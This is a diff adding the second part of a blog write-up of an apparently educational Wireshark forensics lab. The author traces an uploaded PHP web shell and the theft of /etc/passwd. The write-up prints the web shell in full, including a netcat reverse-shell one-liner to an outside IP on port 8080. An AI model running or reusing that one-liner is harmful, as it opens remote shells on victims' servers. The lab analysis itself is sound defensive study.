@@ -47,4 +47,42 @@ Well, it wasn't. The input validation mechanism of this server should definitely
 
 ---
 
-To be continued...
+#### Pt. 2
+
+My next step was to identify the web server's directory that is used for storing uploaded files. This is crucial to locating the malicious upload, and locating the vulnerable page. To do that, I would have to find the URI identifying that directory. So I entered the following:
+
+`http.request.uri contains "image.jpg.php"`
+
+From there I found out the web server uses the directory: /reviews/uploads/ for storing uploaded files. At this point, mentioning this vulnerability would be my priority in the real world, and as an entry-level analyst I would most likely escalate this issue. Escalation makes sense because the attacker is exploiting important server infrastructure. 
+
+Finding the port used by the attacker was also simple. It is located within the content of the uploaded web shell file. 
+
+`<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>`
+
+By examining the content of this file, I was able to notice this part: *nc 117.11.88.124 8080*. This reveals to me that the attacker was using netcat (nc) to attempt to establish a connection back to the attacker's system, while using port 8080. 
+
+This information is vital when investigating a breach such as this one. Finding the port number helps in identifying the attacker's method as well as help in configuring the firewall/IDS systems to block 8080 connections in the future, if they are unneeded. 
+
+My last step involves finding out the exact name of the file that the attacker attempted to exfiltrate. To do that, I entered a query in that would isolate data being sent from the victim web server using port 8080 (the same port the attacker was using). 
+
+`(tcp.port == 8080) && (ip.src == 24.49.63.79)`
+
+![curl evidence](security.github.io/images/curl_evidence.png)
+
+I was quickly able to find that the attacker used curl to attempt to exfiltrate etc/passwd. Obviously, that is a critical file, as it contains information on all system users. Nowadays, passwords are stored in shadow files, so the passwords are going to be safe. But in terms of value, etc/passwd is extremely useful for attackers. 
+
+It can help them map the network out, and give them knowledge as to areas they can exploit. It is extremely valuable recon intel. 
+
+---
+
+With that, I was finished with the task at hand. This was a fun lab! Using Wireshark to figure out exactly what happened is almost like being a digital detective. It feels like a puzzle waiting to be solved. Although at times it can be frustrating, the process does feel intuitive after a while. 
+
+Here are my findings in a concise 5W format. 
+
+WHO: `117.11.88.124` (located in Tianjin, China)
+WHERE: Vulnerable web server, using Port 8080
+WHEN: Thu, 30 Nov 2023 18:44:19 GMT
+WHAT: Malicious php script uploaded on web server
+WHY: For the purpose of exfiltrating etc/passwd
+
+Thank you for reading through my first blog post! More will be coming shortly. I will try and upload most of the labs I work on, if they are in anyway interesting. 
